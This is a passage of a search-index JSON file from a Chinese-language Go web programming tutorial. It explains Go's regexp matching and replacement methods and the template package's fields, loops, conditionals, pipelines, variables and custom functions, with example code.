[]byte) []byte\nfunc (re *Regexp) FindAll(b []byte, n int) [][]byte\nfunc (re *Regexp) FindAllIndex(b []byte, n int) [][]int\nfunc (re *Regexp) FindAllSubmatch(b []byte, n int) [][][]byte\nfunc (re *Regexp) FindAllSubmatchIndex(b []byte, n int) [][]int\nfunc (re *Regexp) FindIndex(b []byte) (loc []int)\nfunc (re *Regexp) FindSubmatch(b []byte) [][]byte\nfunc (re *Regexp) FindSubmatchIndex(b []byte) []int\n</code></pre> \u5bf9\u4e8e\u8fd9\u4e9b\u51fd\u6570\u7684\u4f7f\u7528\u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50 <pre><code>package main\n\nimport (\n\"fmt\"\n\"regexp\"\n)\n\nfunc main() {\na := \"I am learning Go language\"\n\nre, _ := regexp.Compile(\"[a-z]{2,4}\")\n\n//\u67e5\u627e\u7b26\u5408\u6b63\u5219\u7684\u7b2c\u4e00\u4e2a\none := re.Find([]byte(a))\nfmt.Println(\"Find:\", string(one))\n\n//\u67e5\u627e\u7b26\u5408\u6b63\u5219\u7684\u6240\u6709slice,n\u5c0f\u4e8e0\u8868\u793a\u8fd4\u56de\u5168\u90e8\u7b26\u5408\u7684\u5b57\u7b26\u4e32\uff0c\u4e0d\u7136\u5c31\u662f\u8fd4\u56de\u6307\u5b9a\u7684\u957f\u5ea6\nall := re.FindAll([]byte(a), -1)\nfmt.Println(\"FindAll\", all)\n\n//\u67e5\u627e\u7b26\u5408\u6761\u4ef6\u7684index\u4f4d\u7f6e,\u5f00\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e\nindex := re.FindIndex([]byte(a))\nfmt.Println(\"FindIndex\", index)\n\n//\u67e5\u627e\u7b26\u5408\u6761\u4ef6\u7684\u6240\u6709\u7684index\u4f4d\u7f6e\uff0cn\u540c\u4e0a\nallindex := re.FindAllIndex([]byte(a), -1)\nfmt.Println(\"FindAllIndex\", allindex)\n\nre2, _ := regexp.Compile(\"am(.*)lang(.*)\")\n\n//\u67e5\u627eSubmatch,\u8fd4\u56de\u6570\u7ec4\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u5339\u914d\u7684\u5168\u90e8\u5143\u7d20\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u7b2c\u4e00\u4e2a()\u91cc\u9762\u7684\uff0c\u7b2c\u4e09\u4e2a\u662f\u7b2c\u4e8c\u4e2a()\u91cc\u9762\u7684\n//\u4e0b\u9762\u7684\u8f93\u51fa\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\"am learning Go language\"\n//\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\" learning Go \"\uff0c\u6ce8\u610f\u5305\u542b\u7a7a\u683c\u7684\u8f93\u51fa\n//\u7b2c\u4e09\u4e2a\u5143\u7d20\u662f\"uage\"\nsubmatch := re2.FindSubmatch([]byte(a))\nfmt.Println(\"FindSubmatch\", submatch)\nfor _, v := range submatch {\nfmt.Println(string(v))\n}\n\n//\u5b9a\u4e49\u548c\u4e0a\u9762\u7684FindIndex\u4e00\u6837\nsubmatchindex := re2.FindSubmatchIndex([]byte(a))\nfmt.Println(submatchindex)\n\n//FindAllSubmatch,\u67e5\u627e\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u5b50\u5339\u914d\nsubmatchall := re2.FindAllSubmatch([]byte(a), -1)\nfmt.Println(submatchall)\n\n//FindAllSubmatchIndex,\u67e5\u627e\u6240\u6709\u5b57\u5339\u914d\u7684index\nsubmatchallindex := re2.FindAllSubmatchIndex([]byte(a), -1)\nfmt.Println(submatchallindex)\n}\n</code></pre> \u524d\u9762\u4ecb\u7ecd\u8fc7\u5339\u914d\u51fd\u6570\uff0cRegexp\u4e5f\u5b9a\u4e49\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5b83\u4eec\u548c\u540c\u540d\u7684\u5916\u90e8\u51fd\u6570\u529f\u80fd\u4e00\u6a21\u4e00\u6837\uff0c\u5176\u5b9e\u5916\u90e8\u51fd\u6570\u5c31\u662f\u8c03\u7528\u4e86\u8fd9Regexp\u7684\u4e09\u4e2a\u51fd\u6570\u6765\u5b9e\u73b0\u7684\uff1a <pre><code>func (re *Regexp) Match(b []byte) bool\nfunc (re *Regexp) MatchReader(r io.RuneReader) bool\nfunc (re *Regexp) MatchString(s string) bool\n</code></pre> \u63a5\u4e0b\u91cc\u8ba9\u6211\u4eec\u6765\u4e86\u89e3\u66ff\u6362\u51fd\u6570\u662f\u600e\u4e48\u64cd\u4f5c\u7684\uff1f <pre><code>func (re *Regexp) ReplaceAll(src, repl []byte) []byte\nfunc (re *Regexp) ReplaceAllFunc(src []byte, repl func([]byte) []byte) []byte\nfunc (re *Regexp) ReplaceAllLiteral(src, repl []byte) []byte\nfunc (re *Regexp) ReplaceAllLiteralString(src, repl string) string\nfunc (re *Regexp) ReplaceAllString(src, repl string) string\nfunc (re *Regexp) ReplaceAllStringFunc(src string, repl func(string) string) string\n</code></pre> \u8fd9\u4e9b\u66ff\u6362\u51fd\u6570\u6211\u4eec\u5728\u4e0a\u9762\u7684\u6293\u7f51\u9875\u7684\u4f8b\u5b50\u6709\u8be6\u7ec6\u5e94\u7528\u793a\u4f8b\uff0c</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u4e00\u4e0bExpand\u7684\u89e3\u91ca\uff1a <pre><code>func (re *Regexp) Expand(dst []byte, template []byte, src []byte, match []int) []byte\nfunc (re *Regexp) ExpandString(dst []byte, template string, src string, match []int) []byte\n</code></pre> \u90a3\u4e48\u8fd9\u4e2aExpand\u5230\u5e95\u7528\u6765\u5e72\u561b\u7684\u5462\uff1f\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a <pre><code>func main() {\nsrc := []byte(`\n        call hello alice\n        hello bob\n        call hello eve\n    `)\npat := regexp.MustCompile(`(?m)(call)\\s+(?P&lt;cmd&gt;\\w+)\\s+(?P&lt;arg&gt;.+)\\s*$`)\nres := []byte{}\nfor _, s := range pat.FindAllSubmatchIndex(src, -1) {\nres = pat.Expand(res, []byte(\"$cmd('$arg')\\n\"), src, s)\n}\nfmt.Println(string(res))\n}\n</code></pre> \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u5168\u90e8\u4ecb\u7ecd\u5b8cGo\u8bed\u8a00\u7684<code>regexp</code>\u5305\uff0c\u901a\u8fc7\u5bf9\u5b83\u7684\u4e3b\u8981\u51fd\u6570\u4ecb\u7ecd\u53ca\u6f14\u793a\uff0c\u76f8\u4fe1\u5927\u5bb6\u5e94\u8be5\u80fd\u591f\u901a\u8fc7Go\u8bed\u8a00\u7684\u6b63\u5219\u5305\u8fdb\u884c\u4e00\u4e9b\u57fa\u672c\u7684\u6b63\u5219\u7684\u64cd\u4f5c\u4e86\u3002</p>"},{"location":"07.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Json\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: \u6a21\u677f\u5904\u7406</li> </ul>"},{"location":"07.4/","title":"7.4 \u6a21\u677f\u5904\u7406","text":""},{"location":"07.4/#_1","title":"\u4ec0\u4e48\u662f\u6a21\u677f","text":"<p>\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7\u4e00\u79cd\u53eb\u505aMVC\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff0cModel\u5904\u7406\u6570\u636e\uff0cView\u5c55\u73b0\u7ed3\u679c\uff0cController\u63a7\u5236\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u81f3\u4e8eView\u5c42\u7684\u5904\u7406\uff0c\u5728\u5f88\u591a\u52a8\u6001\u8bed\u8a00\u91cc\u9762\u90fd\u662f\u901a\u8fc7\u5728\u9759\u6001HTML\u4e2d\u63d2\u5165\u52a8\u6001\u8bed\u8a00\u751f\u6210\u7684\u6570\u636e\uff0c\u4f8b\u5982JSP\u4e2d\u901a\u8fc7\u63d2\u5165<code>&lt;%=....=%&gt;</code>\uff0cPHP\u4e2d\u901a\u8fc7\u63d2\u5165<code>&lt;?php.....?&gt;</code>\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u901a\u8fc7\u4e0b\u9762\u8fd9\u4e2a\u56fe\u53ef\u4ee5\u8bf4\u660e\u6a21\u677f\u7684\u673a\u5236</p> <p></p> <p>\u56fe7.1 \u6a21\u677f\u673a\u5236\u56fe</p> <p>Web\u5e94\u7528\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4e2d\u7684\u5927\u90e8\u5206\u5185\u5bb9\u662f\u9759\u6001\u7684\uff0c\u4e0d\u53d8\u7684\uff0c\u800c\u53e6\u5916\u5c11\u90e8\u5206\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u6765\u52a8\u6001\u751f\u6210\u7684\uff0c\u4f8b\u5982\u8981\u663e\u793a\u7528\u6237\u7684\u8bbf\u95ee\u8bb0\u5f55\u5217\u8868\u3002\u7528\u6237\u4e4b\u95f4\u53ea\u6709\u8bb0\u5f55\u6570\u636e\u662f\u4e0d\u540c\u7684\uff0c\u800c\u5217\u8868\u7684\u6837\u5f0f\u5219\u662f\u56fa\u5b9a\u7684\uff0c\u6b64\u65f6\u91c7\u7528\u6a21\u677f\u53ef\u4ee5\u590d\u7528\u5f88\u591a\u9759\u6001\u4ee3\u7801\u3002</p>"},{"location":"07.4/#go","title":"Go\u6a21\u677f\u4f7f\u7528","text":"<p>\u5728Go\u8bed\u8a00\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528<code>template</code>\u5305\u6765\u8fdb\u884c\u6a21\u677f\u5904\u7406\uff0c\u4f7f\u7528\u7c7b\u4f3c<code>Parse</code>\u3001<code>ParseFile</code>\u3001<code>Execute</code>\u7b49\u65b9\u6cd5\u4ece\u6587\u4ef6\u6216\u8005\u5b57\u7b26\u4e32\u52a0\u8f7d\u6a21\u677f\uff0c\u7136\u540e\u6267\u884c\u7c7b\u4f3c\u4e0a\u9762\u56fe\u7247\u5c55\u793a\u7684\u6a21\u677f\u7684merge\u64cd\u4f5c\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a <pre><code>func handler(w http.ResponseWriter, r *http.Request) {\nt := template.New(\"some template\") //\u521b\u5efa\u4e00\u4e2a\u6a21\u677f\nt, _ = t.ParseFiles(\"tmpl/welcome.html\")  //\u89e3\u6790\u6a21\u677f\u6587\u4ef6\nuser := GetUser() //\u83b7\u53d6\u5f53\u524d\u7528\u6237\u4fe1\u606f\nt.Execute(w, user)  //\u6267\u884c\u6a21\u677f\u7684merger\u64cd\u4f5c\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u770b\u5230Go\u8bed\u8a00\u7684\u6a21\u677f\u64cd\u4f5c\u975e\u5e38\u7684\u7b80\u5355\u65b9\u4fbf\uff0c\u548c\u5176\u4ed6\u8bed\u8a00\u7684\u6a21\u677f\u5904\u7406\u7c7b\u4f3c\uff0c\u90fd\u662f\u5148\u83b7\u53d6\u6570\u636e\uff0c\u7136\u540e\u6e32\u67d3\u6570\u636e\u3002</p> <p>\u4e3a\u4e86\u6f14\u793a\u548c\u6d4b\u8bd5\u4ee3\u7801\u7684\u65b9\u4fbf\uff0c\u6211\u4eec\u5728\u63a5\u4e0b\u6765\u7684\u4f8b\u5b50\u4e2d\u91c7\u7528\u5982\u4e0b\u683c\u5f0f\u7684\u4ee3\u7801</p> <ul> <li>\u4f7f\u7528Parse\u4ee3\u66ffParseFiles\uff0c\u56e0\u4e3aParse\u53ef\u4ee5\u76f4\u63a5\u6d4b\u8bd5\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u9700\u8981\u989d\u5916\u7684\u6587\u4ef6</li> <li>\u4e0d\u4f7f\u7528handler\u6765\u5199\u6f14\u793a\u4ee3\u7801\uff0c\u800c\u662f\u6bcf\u4e2a\u6d4b\u8bd5\u4e00\u4e2amain\uff0c\u65b9\u4fbf\u6d4b\u8bd5</li> <li>\u4f7f\u7528<code>os.Stdout</code>\u4ee3\u66ff<code>http.ResponseWriter</code>\uff0c\u56e0\u4e3a<code>os.Stdout</code>\u5b9e\u73b0\u4e86<code>io.Writer</code>\u63a5\u53e3</li> </ul>"},{"location":"07.4/#_2","title":"\u6a21\u677f\u4e2d\u5982\u4f55\u63d2\u5165\u6570\u636e\uff1f","text":"<p>\u4e0a\u9762\u6211\u4eec\u6f14\u793a\u4e86\u5982\u4f55\u89e3\u6790\u5e76\u6e32\u67d3\u6a21\u677f\uff0c\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u6765\u66f4\u52a0\u8be6\u7ec6\u7684\u4e86\u89e3\u5982\u4f55\u628a\u6570\u636e\u6e32\u67d3\u51fa\u6765\u3002\u4e00\u4e2a\u6a21\u677f\u90fd\u662f\u5e94\u7528\u5728\u4e00\u4e2aGo\u7684\u5bf9\u8c61\u4e4b\u4e0a\uff0cGo\u5bf9\u8c61\u7684\u5b57\u6bb5\u5982\u4f55\u63d2\u5165\u5230\u6a21\u677f\u4e2d\u5462\uff1f</p>"},{"location":"07.4/#_3","title":"\u5b57\u6bb5\u64cd\u4f5c","text":"<p>Go\u8bed\u8a00\u7684\u6a21\u677f\u901a\u8fc7<code>{{}}</code>\u6765\u5305\u542b\u9700\u8981\u5728\u6e32\u67d3\u65f6\u88ab\u66ff\u6362\u7684\u5b57\u6bb5\uff0c<code>{{.}}</code>\u8868\u793a\u5f53\u524d\u7684\u5bf9\u8c61\uff0c\u8fd9\u548cJava\u6216\u8005C++\u4e2d\u7684this\u7c7b\u4f3c\uff0c\u5982\u679c\u8981\u8bbf\u95ee\u5f53\u524d\u5bf9\u8c61\u7684\u5b57\u6bb5\u901a\u8fc7<code>{{.FieldName}}</code>\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u4e00\u70b9\uff1a\u8fd9\u4e2a\u5b57\u6bb5\u5fc5\u987b\u662f\u5bfc\u51fa\u7684(\u5b57\u6bb5\u9996\u5b57\u6bcd\u5fc5\u987b\u662f\u5927\u5199\u7684)\uff0c\u5426\u5219\u5728\u6e32\u67d3\u7684\u65f6\u5019\u5c31\u4f1a\u62a5\u9519\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u8fd9\u4e2a\u4f8b\u5b50\uff1a <pre><code>package main\n\nimport (\n\"html/template\"\n\"os\"\n)\n\ntype Person struct {\nUserName string\n}\n\nfunc main() {\nt := template.New(\"fieldname example\")\nt, _ = t.Parse(\"hello {{.UserName}}!\")\np := Person{UserName: \"Astaxie\"}\nt.Execute(os.Stdout, p)\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u6b63\u786e\u7684\u8f93\u51fa<code>hello Astaxie</code>\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u7a0d\u5fae\u4fee\u6539\u4e00\u4e0b\u4ee3\u7801\uff0c\u5728\u6a21\u677f\u4e2d\u542b\u6709\u4e86\u672a\u5bfc\u51fa\u7684\u5b57\u6bb5\uff0c\u90a3\u4e48\u5c31\u4f1a\u62a5\u9519 <pre><code>type Person struct {\nUserName string\nemail   string  //\u672a\u5bfc\u51fa\u7684\u5b57\u6bb5\uff0c\u9996\u5b57\u6bcd\u662f\u5c0f\u5199\u7684\n}\n\nt, _ = t.Parse(\"hello {{.UserName}}! {{.email}}\")\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6211\u4eec\u8c03\u7528\u4e86\u4e00\u4e2a\u672a\u5bfc\u51fa\u7684\u5b57\u6bb5\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u8c03\u7528\u4e86\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5b57\u6bb5\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u800c\u662f\u8f93\u51fa\u4e3a\u7a7a\u3002</p> <p>\u5982\u679c\u6a21\u677f\u4e2d\u8f93\u51fa<code>{{.}}</code>\uff0c\u8fd9\u4e2a\u4e00\u822c\u5e94\u7528\u4e8e\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u4f1a\u8c03\u7528fmt\u5305\u8f93\u51fa\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u3002</p>"},{"location":"07.4/#_4","title":"\u8f93\u51fa\u5d4c\u5957\u5b57\u6bb5\u5185\u5bb9","text":"<p>\u4e0a\u9762\u6211\u4eec\u4f8b\u5b50\u5c55\u793a\u4e86\u5982\u4f55\u9488\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b57\u6bb5\u8f93\u51fa\uff0c\u90a3\u4e48\u5982\u679c\u5b57\u6bb5\u91cc\u9762\u8fd8\u6709\u5bf9\u8c61\uff0c\u5982\u4f55\u6765\u5faa\u73af\u7684\u8f93\u51fa\u8fd9\u4e9b\u5185\u5bb9\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>{{with \u2026}}\u2026{{end}}</code>\u548c<code>{{range \u2026}}{{end}}</code>\u6765\u8fdb\u884c\u6570\u636e\u7684\u8f93\u51fa\u3002</p> <ul> <li>{{range}} \u8fd9\u4e2a\u548cGo\u8bed\u6cd5\u91cc\u9762\u7684range\u7c7b\u4f3c\uff0c\u5faa\u73af\u64cd\u4f5c\u6570\u636e</li> <li>{{with}}\u64cd\u4f5c\u662f\u6307\u5f53\u524d\u5bf9\u8c61\u7684\u503c\uff0c\u7c7b\u4f3c\u4e0a\u4e0b\u6587\u7684\u6982\u5ff5</li> </ul> <p>\u8be6\u7ec6\u7684\u4f7f\u7528\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a <pre><code>package main\n\nimport (\n\"html/template\"\n\"os\"\n)\n\ntype Friend struct {\nFname string\n}\n\ntype Person struct {\nUserName string\nEmails   []string\nFriends  []*Friend\n}\n\nfunc main() {\nf1 := Friend{Fname: \"minux.ma\"}\nf2 := Friend{Fname: \"xushiwei\"}\nt := template.New(\"fieldname example\")\nt, _ = t.Parse(`hello {{.UserName}}!\n            {{range .Emails}}\n                an email {{.}}\n            {{end}}\n            {{with .Friends}}\n            {{range .}}\n                my friend name is {{.Fname}}\n            {{end}}\n            {{end}}\n            `)\np := Person{UserName: \"Astaxie\",\nEmails:  []string{\"astaxie@beego.me\", \"astaxie@gmail.com\"},\nFriends: []*Friend{&amp;f1, &amp;f2}}\nt.Execute(os.Stdout, p)\n}\n</code></pre></p>"},{"location":"07.4/#_5","title":"\u6761\u4ef6\u5904\u7406","text":"<p>\u5728Go\u6a21\u677f\u91cc\u9762\u5982\u679c\u9700\u8981\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u548cGo\u8bed\u8a00\u7684<code>if-else</code>\u8bed\u6cd5\u7c7b\u4f3c\u7684\u65b9\u5f0f\u6765\u5904\u7406\uff0c\u5982\u679cpipeline\u4e3a\u7a7a\uff0c\u90a3\u4e48if\u5c31\u8ba4\u4e3a\u662ffalse\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u5c55\u793a\u4e86\u5982\u4f55\u4f7f\u7528<code>if-else</code>\u8bed\u6cd5\uff1a <pre><code>package main\n\nimport (\n\"os\"\n\"text/template\"\n)\n\nfunc main() {\ntEmpty := template.New(\"template test\")\ntEmpty = template.Must(tEmpty.Parse(\"\u7a7a pipeline if demo: {{if ``}} \u4e0d\u4f1a\u8f93\u51fa. {{end}}\\n\"))\ntEmpty.Execute(os.Stdout, nil)\n\ntWithValue := template.New(\"template test\")\ntWithValue = template.Must(tWithValue.Parse(\"\u4e0d\u4e3a\u7a7a\u7684 pipeline if demo: {{if `anything`}} \u6211\u6709\u5185\u5bb9\uff0c\u6211\u4f1a\u8f93\u51fa. {{end}}\\n\"))\ntWithValue.Execute(os.Stdout, nil)\n\ntIfElse := template.New(\"template test\")\ntIfElse = template.Must(tIfElse.Parse(\"if-else demo: {{if `anything`}} if\u90e8\u5206 {{else}} else\u90e8\u5206.{{end}}\\n\"))\ntIfElse.Execute(os.Stdout, nil)\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u6f14\u793a\u4ee3\u7801\u6211\u4eec\u77e5\u9053<code>if-else</code>\u8bed\u6cd5\u76f8\u5f53\u7684\u7b80\u5355\uff0c\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5f88\u5bb9\u6613\u96c6\u6210\u5230\u6211\u4eec\u7684\u6a21\u677f\u4ee3\u7801\u4e2d\u3002</p> <p>\u6ce8\u610f\uff1aif\u91cc\u9762\u65e0\u6cd5\u4f7f\u7528\u6761\u4ef6\u5224\u65ad\uff0c\u4f8b\u5982.Mail==\"astaxie@gmail.com\"\uff0c\u8fd9\u6837\u7684\u5224\u65ad\u662f\u4e0d\u6b63\u786e\u7684\uff0cif\u91cc\u9762\u53ea\u80fd\u662fbool\u503c</p>"},{"location":"07.4/#pipelines","title":"pipelines","text":"<p>Unix\u7528\u6237\u5df2\u7ecf\u5f88\u719f\u6089\u4ec0\u4e48\u662f<code>pipe</code>\u4e86\uff0c<code>ls | grep \"beego\"</code>\u7c7b\u4f3c\u8fd9\u6837\u7684\u8bed\u6cd5\u4f60\u662f\u4e0d\u662f\u7ecf\u5e38\u4f7f\u7528\uff0c\u8fc7\u6ee4\u5f53\u524d\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u663e\u793a\u542b\u6709\"beego\"\u7684\u6570\u636e\uff0c\u8868\u8fbe\u7684\u610f\u601d\u5c31\u662f\u524d\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u5f53\u505a\u540e\u9762\u7684\u8f93\u5165\uff0c\u6700\u540e\u663e\u793a\u6211\u4eec\u60f3\u8981\u7684\u6570\u636e\uff0c\u800cGo\u8bed\u8a00\u6a21\u677f\u6700\u5f3a\u5927\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301pipe\u6570\u636e\uff0c\u5728Go\u8bed\u8a00\u91cc\u9762\u4efb\u4f55<code>{{}}</code>\u91cc\u9762\u7684\u90fd\u662fpipelines\u6570\u636e\uff0c\u4f8b\u5982\u6211\u4eec\u4e0a\u9762\u8f93\u51fa\u7684email\u91cc\u9762\u5982\u679c\u8fd8\u6709\u4e00\u4e9b\u53ef\u80fd\u5f15\u8d77XSS\u6ce8\u5165\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u6765\u8fdb\u884c\u8f6c\u5316\u5462\uff1f <pre><code>{{. | html}}\n</code></pre> \u5728email\u8f93\u51fa\u7684\u5730\u65b9\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u5982\u4e0a\u65b9\u5f0f\u53ef\u4ee5\u628a\u8f93\u51fa\u5168\u90e8\u8f6c\u5316html\u7684\u5b9e\u4f53\uff0c\u4e0a\u9762\u7684\u8fd9\u79cd\u65b9\u5f0f\u548c\u6211\u4eec\u5e73\u5e38\u5199Unix\u7684\u65b9\u5f0f\u662f\u4e0d\u662f\u4e00\u6a21\u4e00\u6837\uff0c\u64cd\u4f5c\u8d77\u6765\u76f8\u5f53\u7684\u7b80\u4fbf\uff0c\u8c03\u7528\u5176\u4ed6\u7684\u51fd\u6570\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u5f0f\u3002</p>"},{"location":"07.4/#_6","title":"\u6a21\u677f\u53d8\u91cf","text":"<p>\u6709\u65f6\u5019\uff0c\u6211\u4eec\u5728\u6a21\u677f\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u9700\u8981\u5b9a\u4e49\u4e00\u4e9b\u5c40\u90e8\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e00\u4e9b\u64cd\u4f5c\u4e2d\u7533\u660e\u5c40\u90e8\u53d8\u91cf\uff0c\u4f8b\u5982<code>with``range``if</code>\u8fc7\u7a0b\u4e2d\u7533\u660e\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u662f<code>{{end}}</code>\u4e4b\u524d\uff0cGo\u8bed\u8a00\u901a\u8fc7\u7533\u660e\u7684\u5c40\u90e8\u53d8\u91cf\u683c\u5f0f\u5982\u4e0b\u6240\u793a\uff1a <pre><code>$variable := pipeline\n</code></pre> \u8be6\u7ec6\u7684\u4f8b\u5b50\u770b\u4e0b\u9762\u7684\uff1a <pre><code>{{with $x := \"output\" | printf \"%q\"}}{{$x}}{{end}}\n{{with $x := \"output\"}}{{printf \"%q\" $x}}{{end}}\n{{with $x := \"output\"}}{{$x | printf \"%q\"}}{{end}}\n</code></pre></p>"},{"location":"07.4/#_7","title":"\u6a21\u677f\u51fd\u6570","text":"<p>\u6a21\u677f\u5728\u8f93\u51fa\u5bf9\u8c61\u7684\u5b57\u6bb5\u503c\u65f6\uff0c\u91c7\u7528\u4e86<code>fmt</code>\u5305\u628a\u5bf9\u8c61\u8f6c\u5316\u6210\u4e86\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6709\u65f6\u5019\u6211\u4eec\u7684\u9700\u6c42\u53ef\u80fd\u4e0d\u662f\u8fd9\u6837\u7684\uff0c\u4f8b\u5982\u6709\u65f6\u5019\u6211\u4eec\u4e3a\u4e86\u9632\u6b62\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u8005\u901a\u8fc7\u91c7\u96c6\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u53d1\u9001\u7ed9\u6211\u4eec\u7684\u90ae\u7bb1\u4fe1\u606f\uff0c\u6211\u4eec\u5e0c\u671b\u628a<code>@</code>\u66ff\u6362\u6210<code>at</code>\u4f8b\u5982\uff1a<code>astaxie at beego.me</code>\uff0c\u5982\u679c\u8981\u5b9e\u73b0\u8fd9\u6837\u7684\u529f\u80fd\uff0c\u6211\u4eec\u5c31\u9700\u8981\u81ea\u5b9a\u4e49\u51fd\u6570\u6765\u505a\u8fd9\u4e2a\u529f\u80fd\u3002</p> <p>\u6bcf\u4e00\u4e2a\u6a21\u677f\u51fd\u6570\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u503c\u7684\u540d\u5b57\uff0c\u7136\u540e\u4e0e\u4e00\u4e2aGo\u51fd\u6570\u5173\u8054\uff0c\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u5173\u8054 <pre><code>type FuncMap map[string]interface{}\n</code></pre> \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u7684email\u51fd\u6570\u7684\u6a21\u677f\u51fd\u6570\u540d\u662f<code>emailDeal</code>\uff0c\u5b83\u5173\u8054\u7684Go\u51fd\u6570\u540d\u79f0\u662f<code>EmailDealWith</code>,\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\u6765\u6ce8\u518c\u8fd9\u4e2a\u51fd\u6570 <pre><code>t = t.Funcs(template.FuncMap{\"emailDeal\": EmailDealWith})\n</code></pre> <code>EmailDealWith</code>\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u5b9a\u4e49\u5982\u4e0b\uff1a <pre><code>func EmailDealWith(args \u2026interface{}) string\n</code></pre> \u6211\u4eec\u6765\u770b\u4e0b\u9762\u7684\u5b9e\u73b0\u4f8b\u5b50\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"html/template\"\n\"os\"\n\"strings\"\n)\n\ntype Friend struct {\nFname string\n}\n\ntype Person struct {\nUserName string\nEmails   []string\nFriends  []*Friend\n}\n\nfunc EmailDealWith(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\n// find the @ symbol\nsubstrs := strings.Split(s, \"@\")\nif len(substrs) != 2 {\nreturn s\n}\n// replace the @ by \" at \"\nreturn (substrs[0] + \" at \" + substrs[1])\n}\n\nfunc main() {\nf1 := Friend{Fname: \"minux.ma\"}\nf2 := Friend{Fname: \"xushiwei\"}\nt := template.New(\"fieldname example\")\nt = t.Funcs(template.FuncMap{\"emailDeal\": EmailDealWith})\nt, _ = t.Parse(`hello {{.UserName}}!\n                {{range .Emails}}\n                    an emails {{.|emailDeal}}\n                {{end}}\n                {{with .Friends}}\n                {{range .}}\n                    my friend name is {{.Fname}}\n                {{end}}\n                {{end}}\n                `)\np := Person{UserName: \"Astaxie\",\nEmails:  []string{\"astaxie@beego.me\", \"astaxie@gmail.com\"},\nFriends: []*Friend{&amp;f1, &amp;f2}}\nt.Execute(os.Stdout, p)\n}\n</code></pre> \u4e0a\u9762\u6f14\u793a\u4e86\u5982\u4f55\u81ea\u5b9a\u4e49\u51fd\u6570\uff0c\u5176\u5b9e\uff0c\u5728\u6a21\u677f\u5305\u5185\u90e8\u5df2\u7ecf\u6709\u5185\u7f6e\u7684\u5b9e\u73b0\u51fd\u6570\uff0c\u4e0b\u9762\u4ee3\u7801\u622a\u53d6\u81ea\u6a21\u677f\u5305\u91cc\u9762 <pre><code>var builtins = FuncMap{\n\"and\":      and,\n\"call\":     call,\n\"html\":     HTMLEscaper,\n\"index\":    index,\n\"js\":       JSEscaper,\n\"len\":      length,\n\"not\":      not,\n\"or\":       or,\n\"print\":    fmt.Sprint,\n\"printf\":   fmt.Sprintf,\n\"println\":  fmt.Sprintln,\n\"urlquery\": 